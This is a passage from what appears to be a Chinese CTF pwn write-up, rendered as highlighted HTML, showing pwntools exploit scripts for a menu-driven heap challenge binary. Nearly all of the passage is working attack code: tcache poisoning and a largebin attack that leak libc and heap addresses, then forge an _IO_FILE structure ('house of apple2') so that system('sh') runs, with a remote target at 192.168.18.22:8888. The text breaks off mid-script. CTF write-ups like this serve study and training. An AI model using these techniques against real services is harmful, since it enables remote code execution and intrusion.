    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">idx? </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">commend</span><span class="p">):</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt;&gt;</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">idx? </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
    <span class="nf">sa</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">content :</span><span class="sh">'</span><span class="p">,</span><span class="n">commend</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exit</span><span class="p">():</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt;&gt;</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">5</span><span class="sh">'</span><span class="p">)</span>


<span class="nf">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x100</span><span class="p">)</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="nf">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">content :</span><span class="sh">'</span><span class="p">)</span>
<span class="n">heap_base</span> <span class="o">=</span> <span class="p">(((</span><span class="nf">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">12</span><span class="p">)</span><span class="o">-</span><span class="mh">0x2000</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">4</span>
<span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">heap_base:</span><span class="si">{</span><span class="n">heap_base</span><span class="si">:</span><span class="c1">#x</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x500</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0x10</span><span class="p">)</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="nf">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">content : </span><span class="sh">'</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">()</span><span class="o">-</span><span class="mi">2206944</span>

<span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">libc_base:</span><span class="si">{</span><span class="n">libc_base</span><span class="si">:</span><span class="c1">#x</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x100</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x100</span><span class="p">)</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1">#产生tcache bin0
</span><span class="nf">dele</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="c1">#产生tcache bin1
</span>
<span class="c1">#tcache bin1 -&gt; fd = tcache bin0 
</span>
<span class="n">stderr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_2_1_stderr_</span><span class="sh">'</span><span class="p">]</span>
<span class="n">sys_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span>

<span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x3b0</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">12</span>
<span class="nf">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="n">key</span><span class="o">^</span><span class="n">stderr</span><span class="p">))</span> <span class="c1">#修改chunk4的fd
</span>
<span class="nf">debug</span><span class="p">()</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mh">0x100</span><span class="p">)</span> 
<span class="nf">add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mh">0x100</span><span class="p">)</span>

<span class="n">fake_file</span> <span class="o">=</span> <span class="nf">flat</span><span class="p">({</span>
    <span class="mh">0x0</span><span class="p">:</span> <span class="sa">b</span><span class="sh">"</span><span class="s">  sh;</span><span class="sh">"</span><span class="p">,</span>
    <span class="mh">0x28</span><span class="p">:</span> <span class="n">sys_addr</span><span class="p">,</span>
    <span class="mh">0xa0</span><span class="p">:</span> <span class="n">stderr</span><span class="o">-</span><span class="mh">0x40</span><span class="p">,</span>   <span class="c1"># _wide_data
</span>    <span class="mh">0xD8</span><span class="p">:</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_wfile_jumps</span><span class="sh">'</span><span class="p">],</span> <span class="c1"># jumptable 
</span><span class="p">},</span> <span class="n">filler</span><span class="o">=</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>

<span class="nf">edit</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="n">fake_file</span><span class="p">)</span>
<span class="nf">exit</span><span class="p">()</span>

<span class="nf">inter</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h5 id="方法3-largebin-attackhouse-of-apple2">方法3: largebin attack+house of apple2</h5>

<p>自学的</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">pwncli</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">pwn</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./heap</span><span class="sh">'</span>
<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./libc.so.6</span><span class="sh">'</span><span class="p">)</span>

<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="sh">'</span><span class="s">REMOTE</span><span class="sh">'</span><span class="p">]:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">192.168.18.22</span><span class="sh">'</span><span class="p">,</span> <span class="mi">8888</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">pwn</span><span class="p">)</span>

<span class="nf">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#context.terminal = ['tmux','splitw','-h']
</span><span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">pwn</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="n">context</span><span class="p">.</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
<span class="n">pr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span><span class="p">:</span> <span class="nf">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
<span class="n">inter</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>

<span class="n">l32</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\xf7</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">l64</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x7f</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu32_hex</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">0x</span><span class="sh">'</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="o">+</span> <span class="nf">r</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64_hex</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">0x</span><span class="sh">'</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="o">+</span> <span class="nf">r</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">uuu64</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x7f</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uuuu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">target</span><span class="p">:</span> <span class="nf">u64</span><span class="p">((</span><span class="nf">ru</span><span class="p">(</span><span class="n">target</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">:]</span> <span class="o">+</span> <span class="nf">r</span><span class="p">(</span><span class="mi">5</span><span class="p">)).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>

<span class="n">int16</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">,</span> <span class="n">num</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="s">%s -&gt; 0x%x</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">num</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">get_sb</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">get_orw</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">open</span><span class="sh">'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">write</span><span class="sh">'</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">breakpoints</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">breakpoints</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">breakpoints</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">__call_tls_dtors</span><span class="sh">"</span><span class="p">]</span>
    <span class="k">elif</span> <span class="nf">isinstance</span><span class="p">(</span><span class="n">breakpoints</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
        <span class="n">breakpoints</span> <span class="o">=</span> <span class="p">[</span><span class="n">breakpoints</span><span class="p">]</span>
    <span class="n">script</span> <span class="o">=</span> <span class="sh">""</span>
    <span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">breakpoints</span><span class="p">:</span>
        <span class="n">script</span> <span class="o">+=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">b </span><span class="si">{</span><span class="n">bp</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span>
    <span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">proc</span><span class="p">.</span><span class="nf">pidof</span><span class="p">(</span><span class="n">io</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="n">script</span><span class="p">)</span>
    <span class="nf">pause</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">fmt</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">offset</span><span class="o">=</span><span class="mi">14</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="sh">'</span><span class="s">hhn</span><span class="sh">'</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">size</span> <span class="o">==</span> <span class="sh">'</span><span class="s">hhn</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
    <span class="k">elif</span> <span class="n">size</span> <span class="o">==</span> <span class="sh">'</span><span class="s">hn</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
    <span class="k">elif</span> <span class="n">size</span> <span class="o">==</span> <span class="sh">'</span><span class="s">n</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">%</span><span class="si">{</span><span class="n">num</span><span class="si">}</span><span class="s">c%</span><span class="si">{</span><span class="n">offset</span><span class="si">}</span><span class="s">$</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="sh">"</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
    <span class="c1">#value 是格式化字符串偏移          
</span>    <span class="k">return</span> <span class="n">payload</span>

<span class="n">lss</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>

<span class="k">def</span> <span class="nf">cat_flag</span><span class="p">():</span>
    <span class="n">flag_header</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">flag{</span><span class="sh">'</span>
    <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">cat flag</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="n">flag_header</span><span class="p">)</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">flag_header</span> <span class="o">+</span> <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">}</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">}</span><span class="sh">'</span>
    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="c1">#asm(shellcraft.sh()).ljust(0x108,b'a')
</span>
<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">):</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt;&gt;</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">idx? </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">size? </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">dele</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt;&gt;</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">idx? </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt;&gt;</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">idx? </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">commend</span><span class="p">):</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt;&gt;</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">idx? </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
    <span class="nf">sa</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">content :</span><span class="sh">'</span><span class="p">,</span><span class="n">commend</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exit</span><span class="p">():</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">&gt;&gt;</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">5</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">debug</span><span class="p">(</span><span class="sh">"</span><span class="s">_fini</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x520</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x30</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0x510</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x30</span><span class="p">)</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="nf">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">content : </span><span class="sh">'</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">()</span> <span class="o">-</span> <span class="mi">96</span> <span class="o">-</span> <span class="mh">0x21ac80</span>
<span class="nf">lg</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">,</span><span class="n">libc_base</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x550</span><span class="p">)</span>
<span class="nf">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
<span class="nf">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">heap_base</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x290</span>
<span class="nf">lg</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">heap_base</span><span class="sh">'</span><span class="p">,</span><span class="n">heap_base</span><span class="p">)</span>

<span class="n">large</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x21b0e0</span>     	<span class="o">//</span><span class="n">写topchunk</span>
<span class="n">heap</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x800</span> <span class="o">-</span> <span class="mh">0x10</span>
<span class="n">_IO_wfile_jumps</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2170c0</span>
<span class="n">_IO_list_all</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_list_all</span><span class="sh">'</span><span class="p">]</span>
<span class="nf">lg</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">_IO_all_list</span><span class="sh">'</span><span class="p">,</span><span class="n">_IO_list_all</span><span class="p">)</span>
<span class="n">sys_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span>
<span class="n">fake_IO_addr</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x800</span>
<span class="n">_lock</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x21ca60</span>
<span class="nf">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="n">large</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">large</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">_IO_list_all</span><span class="o">-</span><span class="mh">0x20</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">_IO_list_all</span><span class="o">-</span><span class="mh">0x20</span><span class="p">))</span>  
<span class="nf">dele</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="c1">#pause()
</span><span class="nf">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mh">0x550</span><span class="p">)</span>
